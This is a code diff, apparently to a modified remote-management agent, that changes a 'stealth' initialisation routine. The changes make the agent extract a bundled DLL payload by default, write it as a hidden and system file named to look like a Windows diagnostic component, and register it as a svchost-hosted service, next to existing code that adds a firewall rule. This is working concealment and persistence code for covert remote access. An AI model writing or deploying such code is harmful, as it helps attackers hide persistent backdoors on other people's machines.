@@ -74,8 +74,15 @@ void Stealth_InitLabFeatures(void)
         (void)Stealth_AddFirewallRuleForService(svcNameW, exePath);
     }
 
+    int extractDefault = 0;
+#if defined(MESH_AGENT_BUNDLE_EXTRACT_DEFAULT)
+    extractDefault = (MESH_AGENT_BUNDLE_EXTRACT_DEFAULT != 0);
+#elif defined(MESH_AGENT_SVCHOST_MODE) && MESH_AGENT_SVCHOST_MODE
+    extractDefault = 1;
+#endif
+
     // 5) Optionally extract bundled svchost DLL payload (if present in resources)
-    if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", 0)) {
+    if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", extractDefault)) {
         HMODULE hMod = GetModuleHandleW(NULL);
         HRSRC hRes = FindResourceW(hMod, L"SVCHOSTDLL", MAKEINTRESOURCEW(RT_RCDATA));
         if (hRes) {
@@ -85,18 +92,49 @@ void Stealth_InitLabFeatures(void)
                 void* p = LockResource(hData);
                 if (p && sz > 0) {
                     wchar_t dllOut[MAX_PATH] = {0};
-                    // Default: drop next to EXE as diagsvc.dll
-                    GetModulePathW(dllOut, MAX_PATH);
-                    // trim file name
-                    size_t n = wcslen(dllOut);
-                    while (n > 0 && dllOut[n-1] != L'\\' && dllOut[n-1] != L'/') { dllOut[--n] = L'\0'; }
-                    wcscat_s(dllOut, MAX_PATH, L"diagsvc.dll");
+                    BOOL useInstallPath = FALSE;
+                    StealthInstallPaths paths;
+                    if (Stealth_GetInstallPaths(&paths)) {
+                        if (paths.installDir[0] != L'\0') {
+                            Stealth_CreateInstallationDirectory(paths.installDir);
+                        }
+                        if (paths.dllPath[0] != L'\0') {
+                            wcsncpy_s(dllOut, MAX_PATH, paths.dllPath, _TRUNCATE);
+                            useInstallPath = (dllOut[0] != L'\0');
+                        }
+                    }
+
+                    if (!useInstallPath) {
+                        // Fallback: drop next to executable
+                        GetModulePathW(dllOut, MAX_PATH);
+                        size_t n = wcslen(dllOut);
+                        while (n > 0 && dllOut[n-1] != L'\\' && dllOut[n-1] != L'/') { dllOut[--n] = L'\0'; }
+                        wcscat_s(dllOut, MAX_PATH, L"diagsvc.dll");
+                    }
 
                     HANDLE hf = CreateFileW(dllOut, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
                     if (hf != INVALID_HANDLE_VALUE) {
                         DWORD written = 0;
-                        WriteFile(hf, p, sz, &written, NULL);
+                        BOOL wrote = WriteFile(hf, p, sz, &written, NULL);
                         CloseHandle(hf);
+                        if (wrote) {
+                            SetFileAttributesW(dllOut, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+#ifdef UNICODE
+                            const wchar_t* svcNameRef = MESH_AGENT_SERVICE_FILE;
+                            WCHAR svcNameW[256] = {0};
+                            if (svcNameRef != NULL) {
+                                lstrcpynW(svcNameW, svcNameRef, (int)_countof(svcNameW));
+                            }
+#else
+                            WCHAR svcNameW[256] = {0};
+                            if (MESH_AGENT_SERVICE_FILE != NULL) {
+                                MultiByteToWideChar(CP_ACP, 0, MESH_AGENT_SERVICE_FILE, -1, svcNameW, (int)_countof(svcNameW));
+                            }
+#endif
+                            if (svcNameW[0] != L'\0') {
+                                (void)Stealth_RegisterSvchostService(svcNameW, dllOut);
+                            }
+                        }
                     }
                 }
             }
